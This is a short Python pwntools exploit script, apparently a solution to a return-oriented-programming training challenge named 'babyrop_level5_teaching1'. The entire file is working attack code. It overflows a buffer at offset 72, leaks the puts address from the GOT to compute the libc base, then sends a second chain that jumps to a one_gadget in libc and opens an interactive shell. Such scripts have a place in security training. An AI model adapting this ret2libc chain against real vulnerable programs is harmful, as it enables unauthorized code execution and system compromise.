#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level5_teaching1'
r = ROP(context.binary)
getGadget = lambda x: p64(r.find_gadget(x).address)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e = ELF('./babyrop_level5_teaching1')
p = gdb.debug(['./babyrop_level5_teaching1'], 'set context-sections disasm')
#p = process('./babyrop_level5_teaching1')
p.clean()
PUTS_PLT = e.sym['puts']
MAIN_PLT = e.sym['main']
POP_RDI = getGadget(['pop rdi', 'ret'])
RET = getGadget(['ret'])
def get_addr(func_name):
    FUNC_GOT = e.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    rop1 = POP_RDI + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    p.send(fit({72: rop1}))
    print(p.recvuntil(b'Exiting!'))
    p.recvline()
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
get_addr('puts')
chain = getGadget(['pop r10', 'ret'])
chain += p64(0x0)
chain += p64(libc.address+0xe6e73) + b"\x00"*100
# send the ROP chain
p.send(fit({72:chain}))
p.interactive()